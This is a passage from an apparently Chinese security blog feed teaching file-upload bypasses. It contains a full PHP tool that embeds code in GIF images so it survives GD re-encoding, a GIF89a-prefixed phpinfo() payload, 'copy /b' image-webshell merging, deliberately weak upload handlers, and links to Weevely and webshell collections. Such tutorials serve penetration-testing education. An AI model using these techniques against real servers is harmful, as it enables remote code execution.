class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Author: rickchen.vip(at)gmail.com</span></span><br><span class="line"><span class="comment"> * Date: 2015-04-05</span></span><br><span class="line"><span class="comment"> * Desc: Use Similar-Block-Attack to bypass PHP-GD process to RCE</span></span><br><span class="line"><span class="comment"> * Reference: http://www.secgeek.net/bookfresh-vulnerability/</span></span><br><span class="line"><span class="comment"> * Usage: php codeinj.php demo.gif "&lt;?php phpinfo();?&gt;"</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">gd_process</span><span class="params">($src_img, $dst_img)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="comment"># you can redefine the GD process</span></span><br><span class="line">        $im = imagecreatefromgif($src_img);</span><br><span class="line">        imagegif($im, $dst_img);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (<span class="keyword">Exception</span> $e) &#123;</span><br><span class="line">        printf(<span class="string">"%s\n"</span>, $e-&gt;getMessage());</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">find_similar_block</span><span class="params">($src_img, $dst_img, $block_len, $slow=false)</span> </span>&#123;</span><br><span class="line">    $src_data = fread(fopen($src_img, <span class="string">"rb"</span>), filesize($src_img));</span><br><span class="line">    $dst_data = fread(fopen($dst_img, <span class="string">"rb"</span>), filesize($dst_img));</span><br><span class="line">    $src_index = <span class="number">0</span>;</span><br><span class="line">    $pre_match_array = <span class="keyword">array</span>();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> ($src_index &lt; (strlen($src_data) - $block_len)) &#123;</span><br><span class="line">        $find_data = substr($src_data, $src_index, $block_len);</span><br><span class="line"></span><br><span class="line">        $dst_index = <span class="number">0</span>;</span><br><span class="line">        $found = <span class="keyword">false</span>;</span><br><span class="line">        <span class="keyword">while</span> ($dst_index &lt; (strlen($dst_data) - $block_len)) &#123;</span><br><span class="line">            $temp_data = substr($dst_data, $dst_index, $block_len);</span><br><span class="line">            <span class="keyword">if</span> (<span class="number">0</span> === strcmp($find_data, $temp_data)) &#123;</span><br><span class="line">                $match = <span class="keyword">array</span>(</span><br><span class="line">                    <span class="string">"src_offset"</span> =&gt; $src_index,</span><br><span class="line">                    <span class="string">"dst_offset"</span> =&gt; $dst_index</span><br><span class="line">                );</span><br><span class="line">                $pre_match_array[] = $match;</span><br><span class="line">                $found = <span class="keyword">true</span>;</span><br><span class="line"></span><br><span class="line">                <span class="comment">/*</span></span><br><span class="line"><span class="comment">                printf("Similar block found&gt; src_offset: %d\n", $src_index);</span></span><br><span class="line"><span class="comment">                printf("                     dst_offset: %d\n", $dst_index);</span></span><br><span class="line"><span class="comment">                printf("                   similar_data: %s\n", str2hex($temp_data));</span></span><br><span class="line"><span class="comment">                printf("                 similar_length: %s\n\n", strlen($temp_data));</span></span><br><span class="line"><span class="comment">                */</span></span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> ($found &amp;&amp; $slow == <span class="keyword">false</span>)</span><br><span class="line">                $dst_index += $block_len;</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">                $dst_index++;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> ($found &amp;&amp; $slow == <span class="keyword">false</span>)</span><br><span class="line">            $src_index += $block_len;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            $src_index++;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> $pre_match_array;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">inject_code_to_src_img</span><span class="params">($src_img, $pre_match_array, $injection_code)</span> </span>&#123;</span><br><span class="line">    $src_data = fread(fopen($src_img, <span class="string">"rb"</span>), filesize($src_img));</span><br><span class="line">    $inj_len = strlen($injection_code);</span><br><span class="line"></span><br><span class="line">    $find_n = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">foreach</span> ($pre_match_array <span class="keyword">as</span> $similar_block) &#123;</span><br><span class="line">        <span class="comment">#printf("Trying inject code to source image with offset: %d, length: %d\n", $similar_block["src_offset"], $inj_len);</span></span><br><span class="line">        $mod_src_data = substr($src_data, <span class="number">0</span>, $similar_block[<span class="string">"src_offset"</span>]).$injection_code.substr($src_data, $similar_block[<span class="string">"src_offset"</span>] + $inj_len);</span><br><span class="line">        $temp_img = sys_get_temp_dir().<span class="string">"/"</span>.$src_img.<span class="string">".mod"</span>;</span><br><span class="line">        $temp_cvt_img = $temp_img.<span class="string">".gd"</span>;</span><br><span class="line">        fwrite(fopen($temp_img, <span class="string">"wb"</span>), $mod_src_data);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (!gd_process($temp_img, $temp_cvt_img)) &#123;</span><br><span class="line">            <span class="comment">#printf("PHP-GD process() the image modified error, offset: %d\n", $similar_block["src_offset"]);</span></span><br><span class="line">            <span class="comment">#printf("                                           length: %d\n\n", $inj_len);</span></span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">if</span> (check_code($temp_cvt_img, $injection_code)) &#123;</span><br><span class="line">                $fuck_img = <span class="string">"gd_"</span>.$src_img;</span><br><span class="line">                fwrite(fopen($fuck_img, <span class="string">"wb"</span>), $mod_src_data);</span><br><span class="line">                printf(<span class="string">"Inject code to source image successful with offset: %d\n"</span>, $similar_block[<span class="string">"src_offset"</span>]);</span><br><span class="line">                printf(<span class="string">"Saving result \"%s\", have fun! :)\n"</span>, $fuck_img);</span><br><span class="line">                <span class="keyword">exit</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">continue</span>;</span><br><span class="line">                <span class="comment">#printf("Modified image doesn't work well, offset: %d, retry...\n", $similar_block["src_offset"]);</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">check_code</span><span class="params">($src_img, $injection_code)</span> </span>&#123;</span><br><span class="line">    $data = fread(fopen($src_img, <span class="string">"rb"</span>), filesize($src_img));</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> strpos($data, $injection_code);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">str2hex</span><span class="params">($str)</span></span>&#123;</span><br><span class="line">    $hex = <span class="string">""</span>;</span><br><span class="line">    <span class="keyword">for</span> ($i = <span class="number">0</span>; $i &lt; strlen($str); $i++)&#123;</span><br><span class="line">        $hex .= sprintf(<span class="string">"%02x"</span>, (ord($str[$i])));;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> $hex;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">hex2str</span><span class="params">($hex)</span></span>&#123;</span><br><span class="line">    $str = <span class="string">""</span>;</span><br><span class="line">    <span class="keyword">for</span> ($i = <span class="number">0</span>; $i &lt; strlen($hex)<span class="number">-1</span>; $i+=<span class="number">2</span>)&#123;</span><br><span class="line">        $str .= chr(hexdec($hex[$i].$hex[$i+<span class="number">1</span>]));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> $str;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">/* main */</span></span><br><span class="line"><span class="keyword">if</span> ($argc &lt; <span class="number">3</span>) &#123;</span><br><span class="line">    printf(<span class="string">"Usage: php %s &lt;src_img&gt; &lt;inj_code&gt;\n"</span>, $argv[<span class="number">0</span>]);</span><br><span class="line">    <span class="keyword">exit</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$slow = <span class="keyword">false</span>;</span><br><span class="line">$src_img = $argv[<span class="number">1</span>];</span><br><span class="line">$injection_code = $argv[<span class="number">2</span>];</span><br><span class="line"></span><br><span class="line">$img_info = getimagesize($src_img);</span><br><span class="line"></span><br><span class="line"><span class="comment">/* GIF image type value "1" */</span></span><br><span class="line"><span class="keyword">if</span> ($img_info[<span class="number">2</span>] == <span class="string">'1'</span>) &#123;</span><br><span class="line">    $cvt_img = sys_get_temp_dir().<span class="string">"/"</span>.basename($src_img);</span><br><span class="line">    <span class="keyword">if</span> (!gd_process($src_img, $cvt_img)) &#123;</span><br><span class="line">        printf(<span class="string">"PHP-GD process() function error, please check out.\n"</span>);</span><br><span class="line">        <span class="keyword">exit</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    printf(<span class="string">"This script only support GIF image.\n"</span>);</span><br><span class="line">    <span class="keyword">exit</span>;</span><br><span class="line">&#125;</span><br><span class="line">$block_len = strlen($injection_code);</span><br><span class="line">$pre_match_array = find_similar_block($src_img, $cvt_img, $block_len, $slow);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (sizeof($pre_match_array)) &#123;</span><br><span class="line">    inject_code_to_src_img($src_img, $pre_match_array, $injection_code);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    printf(<span class="string">"Not found any similar %d bytes block.\n"</span>, strlen($injection_code));</span><br><span class="line">&#125;</span><br><span class="line">printf(<span class="string">"Cant find any useful similar block to inject code, but take it easy. :(\n"</span>);</span><br></pre></td></tr></table></figure><h4 id="2-5-使用图片转换代码，转换代码"><a href="#2-5-使用图片转换代码，转换代码" class="headerlink" title="2.5 使用图片转换代码，转换代码"></a>2.5 使用图片转换代码，转换代码</h4><ul><li><p>转换操作如图<br><img src="https://cdn.jsdelivr.net/gh/fishni/ImgHosting/Images/A01/20403upload04.png" alt=""></p></li><li><p>查看demo.gif,经过转换后的gd_demo.gif<br><img src="https://cdn.jsdelivr.net/gh/fishni/ImgHosting/Images/A01/20403upload05.png" alt=""></p></li></ul><h4 id="2-6-上传2-5转换后的图片gd-demo-gif"><a href="#2-6-上传2-5转换后的图片gd-demo-gif" class="headerlink" title="2.6 上传2.5转换后的图片gd_demo.gif"></a>2.6 上传2.5转换后的图片gd_demo.gif</h4><ul><li><p>测试结果<br><img src="https://cdn.jsdelivr.net/gh/fishni/ImgHosting/Images/A01/20403upload06.png" alt=""></p></li><li><p>再次分析gd_demo.gif和上传成功的test.gif<br><img src="https://cdn.jsdelivr.net/gh/fishni/ImgHosting/Images/A01/20403upload07.png" alt=""></p></li></ul>]]></content>
      
      
      <categories>
          
          <category> 网络安全 </category>
          
          <category> 文件上传漏洞原理及利用 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> fileupload </tag>
            
            <tag> PHP </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>【文件上传（三）：服务端检测绕过】3.4服务端文件内容检测绕过</title>
      <link href="/2020/03/28/3.4%20%E6%9C%8D%E5%8A%A1%E7%AB%AF%E6%96%87%E4%BB%B6%E5%86%85%E5%AE%B9%E6%A3%80%E6%B5%8B/"/>
      <url>/2020/03/28/3.4%20%E6%9C%8D%E5%8A%A1%E7%AB%AF%E6%96%87%E4%BB%B6%E5%86%85%E5%AE%B9%E6%A3%80%E6%B5%8B/</url>
      
        <content type="html"><![CDATA[<h3 id="本文主要内容"><a href="#本文主要内容" class="headerlink" title="本文主要内容"></a>本文主要内容</h3><ul><li>简单文件头检测、文件幻数检测</li><li>完整文件结构检测</li></ul><a id="more"></a><h3 id="0x01-简单文件头检测"><a href="#0x01-简单文件头检测" class="headerlink" title="0x01 简单文件头检测"></a>0x01 简单文件头检测</h3><ul><li><p>文件幻数检测</p><p>  JPG ： FF D8 FF E0 00 10 4A 46 49 46</p><p>  GIF ： 47 49 46 38 39 61 (GIF89a)</p><p>  PNG： 89 50 4E 47</p></li><li><p>如下图所示代码，是通过文件头的起始部分进行匹配，比较简单的一种文件类型检测方法。</p></li></ul><h4 id="简单文件头检测测试示例"><a href="#简单文件头检测测试示例" class="headerlink" title="简单文件头检测测试示例"></a>简单文件头检测测试示例</h4><ul><li>代码：</li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><span class="line">&lt;meta http-equiv=<span class="string">"Content-Type"</span> content=<span class="string">"text/html; charset=utf-8"</span>/&gt;</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getReailFileType</span><span class="params">($filename)</span></span>&#123;</span><br><span class="line">    $file = fopen($filename, <span class="string">"rb"</span>);</span><br><span class="line">    $bin = fread($file, <span class="number">2</span>); <span class="comment">//只读2字节</span></span><br><span class="line">    fclose($file);</span><br><span class="line">    $strInfo = @unpack(<span class="string">"C2chars"</span>, $bin);    </span><br><span class="line">    $typeCode = intval($strInfo[<span class="string">'chars1'</span>].$strInfo[<span class="string">'chars2'</span>]);    </span><br><span class="line">    $fileType = <span class="string">''</span>;    </span><br><span class="line">    <span class="keyword">switch</span>($typeCode)&#123;      </span><br><span class="line">        <span class="keyword">case</span> <span class="number">255216</span>:            </span><br><span class="line">            $fileType = <span class="string">'jpg'</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">13780</span>:            </span><br><span class="line">            $fileType = <span class="string">'png'</span>;</span><br><span class="line">            <span class="keyword">break</span>;        </span><br><span class="line">        <span class="keyword">case</span> <span class="number">7173</span>:            </span><br><span class="line">            $fileType = <span class="string">'gif'</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">default</span>:            </span><br><span class="line">            $fileType = <span class="string">'unknown'</span>;</span><br><span class="line">        &#125;    </span><br><span class="line">        <span class="keyword">return</span> $fileType;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$is_upload = <span class="keyword">false</span>;</span><br><span class="line">$msg = <span class="keyword">null</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">'submit'</span>]))&#123;</span><br><span class="line">    $temp_file = $_FILES[<span class="string">'upload_file'</span>][<span class="string">'tmp_name'</span>];</span><br><span class="line">    $file_type = getReailFileType($temp_file);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>($file_type == <span class="string">'unknown'</span>)&#123;</span><br><span class="line">        $msg = <span class="string">"文件未知，上传失败！"</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        $img_path = <span class="string">"uploads/"</span>.rand(<span class="number">10</span>, <span class="number">99</span>).<span class="string">"."</span>.$file_type;</span><br><span class="line">        <span class="keyword">if</span>(move_uploaded_file($temp_file,$img_path))&#123;</span><br><span class="line">            $is_upload = <span class="keyword">true</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            $msg = <span class="string">"上传出错！"</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line">&lt;div id=<span class="string">"upload_panel"</span>&gt;</span><br><span class="line">    &lt;ol&gt;</span><br><span class="line">        &lt;li&gt;</span><br><span class="line">            &lt;h3&gt;上传区&lt;/h3&gt;</span><br><span class="line">            &lt;form enctype=<span class="string">"multipart/form-data"</span> method=<span class="string">"post"</span>&gt;</span><br><span class="line">                &lt;p&gt;请选择要上传的图片：&lt;p&gt;</span><br><span class="line">                &lt;input class="input_file" type="file" name="upload_file"/&gt;</span><br><span class="line">                &lt;input class="button" type="submit" name="submit" value="上传"/&gt;</span><br><span class="line">            &lt;/form&gt;</span><br><span class="line">            &lt;div id=<span class="string">"msg"</span>&gt;</span><br><span class="line">                <span class="meta">&lt;?php</span> </span><br><span class="line">                    <span class="keyword">if</span>($msg != <span class="keyword">null</span>)&#123;</span><br><span class="line">                        <span class="keyword">echo</span> <span class="string">"提示："</span>.$msg;</span><br><span class="line">                    &#125;</span><br><span class="line">                <span class="meta">?&gt;</span></span><br><span class="line">            &lt;/div&gt;</span><br><span class="line">            &lt;div id=<span class="string">"img"</span>&gt;</span><br><span class="line">                <span class="meta">&lt;?php</span></span><br><span class="line">                    <span class="keyword">if</span>($is_upload)&#123;</span><br><span class="line">                        <span class="keyword">echo</span> <span class="string">'&lt;img src="'</span>.$img_path.<span class="string">'" width="250px" /&gt;'</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                <span class="meta">?&gt;</span></span><br><span class="line">            &lt;/div&gt;</span><br><span class="line">        &lt;/li&gt;</span><br><span class="line"></span><br><span class="line">    &lt;/ol&gt;</span><br><span class="line">&lt;/div&gt;</span><br></pre></td></tr></table></figure><ul><li><p>如果仅在含phpinfo()的文件（phpinfo.php）将其修改为phpinfo.gif是不行的，需在文件内容开头添加gif的文件幻数GIF8a</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">GIF89a<span class="meta">&lt;?php</span> phpinfo();<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></li><li><p>测试：利用burpsuite截包，repeater重放功能<br><img src="https://cdn.jsdelivr.net/gh/fishni/ImgHosting/Images/A01/20402upload01.png" alt=""></p></li><li><p>利用：利用本地文件包含，访问已上传的图片文件（因为图片无法直接被解析）<br><img src="https://cdn.jsdelivr.net/gh/fishni/ImgHosting/Images/A01/20402upload02.png" alt=""></p></li></ul><h3 id="0x02-完整文件结构检测"><a href="#0x02-完整文件结构检测" class="headerlink" title="0x02 完整文件结构检测"></a>0x02 完整文件结构检测</h3><ul><li>通过调用图像函数（如：getimagesize/imagecreatefromgif/imagecreatefrompng）,进行检测文件是否为图像，需要文件内容保持相对完整，所以无法通过上追加头部起始字节的方法进行绕过。</li><li>但是对于getimagesize，如果在文件头追加GIF89a，也是可以成功上传的，但是imagecreatefromgif等无法绕过</li></ul><h4 id="2-1-绕过方法"><a href="#2-1-绕过方法" class="headerlink" title="2.1 绕过方法"></a>2.1 绕过方法</h4><ul><li>将图片文件与欲上传的文件进行合并绕过检测</li><li>copy命令进行文件合并</li><li>合并后的文件只要未经过清洗或缩放等操作即可通过检测，并保存欲上传文件的完整性</li><li>上传文件的图片部分在解析为PHP时会以乱码显示，建议与尽量小的文件进行合并，否则会有大量乱码</li></ul><h4 id="2-2图片一句话木马制作"><a href="#2-2图片一句话木马制作" class="headerlink" title="2.2图片一句话木马制作"></a>2.2图片一句话木马制作</h4><ul><li>创建一个文件夹，包含a.bat,tp.gif,yjh.php</li><li>a.bat内容为cmd；yjh.php内容为<code>&lt;?php phpinfo(): ?&gt;</code></li><li>点击bat文件进入DOS命令，写入”copy  tp.gif/b+yjh.php  tpyjh.gif” 回车<br><img src="https://cdn.jsdelivr.net/gh/fishni/ImgHosting/Images/A01/20402upload03.png" alt=""></li></ul><h4 id="2-3实战示例"><a href="#2-3实战示例" class="headerlink" title="2.3实战示例"></a>2.3实战示例</h4><ul><li>代码：</li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line">&lt;meta http-equiv=<span class="string">"Content-Type"</span> content=<span class="string">"text/html; charset=utf-8"</span>/&gt;</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">isImage</span><span class="params">($filename)</span></span>&#123;</span><br><span class="line">    $types = <span class="string">'.jpeg|.png|.gif'</span>;</span><br><span class="line">    <span class="keyword">if</span>(file_exists($filename))&#123;</span><br><span class="line">        $info = getimagesize($filename);</span><br><span class="line">        $ext = image_type_to_extension($info[<span class="number">2</span>]);</span><br><span class="line">        <span class="keyword">if</span>(stripos($types,$ext))&#123;</span><br><span class="line">            <span class="keyword">return</span> $ext;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$is_upload = <span class="keyword">false</span>;</span><br><span class="line">$msg = <span class="keyword">null</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">'submit'</span>]))&#123;</span><br><span class="line">    $temp_file = $_FILES[<span class="string">'upload_file'</span>][<span class="string">'tmp_name'</span>];</span><br><span class="line">    $file_type = isImage($temp_file);</span><br><span class="line"><span class="keyword">if</span>(@imagecreatefromgif($temp_file))&#123;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>($file_type == <span class="string">'unknown'</span>)&#123;</span><br><span class="line">$msg = <span class="string">"文件未知，上传失败！"</span>;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">$img_path = <span class="string">"uploads/"</span>.rand(<span class="number">10</span>, <span class="number">99</span>).$file_type;</span><br><span class="line"><span class="keyword">if</span>(move_uploaded_file($temp_file,$img_path))&#123;</span><br><span class="line">$is_upload = <span class="keyword">true</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">$msg = <span class="string">"上传出错！"</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">$msg=<span class="string">"文件不是gif图片"</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line">&lt;div id=<span class="string">"upload_panel"</span>&gt;</span><br><span class="line">    &lt;ol&gt;</span><br><span class="line">        &lt;li&gt;</span><br><span class="line">            &lt;h3&gt;上传区&lt;/h3&gt;</span><br><span class="line">            &lt;form enctype=<span class="string">"multipart/form-data"</span> method=<span class="string">"post"</span>&gt;</span><br><span class="line">                &lt;p&gt;请选择要上传的图片：&lt;p&gt;</span><br><span class="line">                &lt;input class="input_file" type="file" name="upload_file"/&gt;</span><br><span class="line">                &lt;input class="button" type="submit" name="submit" value="上传"/&gt;</span><br><span class="line">            &lt;/form&gt;</span><br><span class="line">            &lt;div id=<span class="string">"msg"</span>&gt;</span><br><span class="line">                <span class="meta">&lt;?php</span> </span><br><span class="line">                    <span class="keyword">if</span>($msg != <span class="keyword">null</span>)&#123;</span><br><span class="line">                        <span class="keyword">echo</span> <span class="string">"提示："</span>.$msg;</span><br><span class="line">                    &#125;</span><br><span class="line">                <span class="meta">?&gt;</span></span><br><span class="line">            &lt;/div&gt;</span><br><span class="line">            &lt;div id=<span class="string">"img"</span>&gt;</span><br><span class="line">                <span class="meta">&lt;?php</span></span><br><span class="line">                    <span class="keyword">if</span>($is_upload)&#123;</span><br><span class="line">                        <span class="keyword">echo</span> <span class="string">'&lt;img src="'</span>.$img_path.<span class="string">'" width="250px" /&gt;'</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                <span class="meta">?&gt;</span></span><br><span class="line">            &lt;/div&gt;</span><br><span class="line">        &lt;/li&gt;</span><br><span class="line"></span><br><span class="line">    &lt;/ol&gt;</span><br><span class="line">&lt;/div&gt;</span><br></pre></td></tr></table></figure><ul><li><p>利用burpsuite重放，获取生成的随机图片文件<br><img src="https://cdn.jsdelivr.net/gh/fishni/ImgHosting/Images/A01/20402upload04.png" alt=""></p></li><li><p>利用本地文件包含访问图片<br><img src="https://cdn.jsdelivr.net/gh/fishni/ImgHosting/Images/A01/20402upload05.png" alt=""></p></li></ul><h3 id="0x03-恶意文件内容检测"><a href="#0x03-恶意文件内容检测" class="headerlink" title="0x03 恶意文件内容检测"></a>0x03 恶意文件内容检测</h3><ul><li>检测提交内容中是否包含Webshell等数据</li><li>推荐使用强混淆的weevely进行尝试，kail中自带<br><a href="https://github.com/sunge/Weevely" target="_blank" rel="noopener">https://github.com/sunge/Weevely</a></li><li>或者尝试开源的webshell收集项目<br><a href="https://github.com/tennc/webshell" target="_blank" rel="noopener">https://github.com/tennc/webshell</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> 网络安全 </category>
          
          <category> 文件上传漏洞原理及利用 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> fileupload </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>【文件上传（三）：服务端检测绕过】3.1服务端MIME类型检测绕过</title>
      <link href="/2020/03/27/3.1%20%E6%9C%8D%E5%8A%A1%E7%AB%AFMIME%E7%B1%BB%E5%9E%8B%E6%A3%80%E6%B5%8B%E7%BB%95%E8%BF%87/"/>
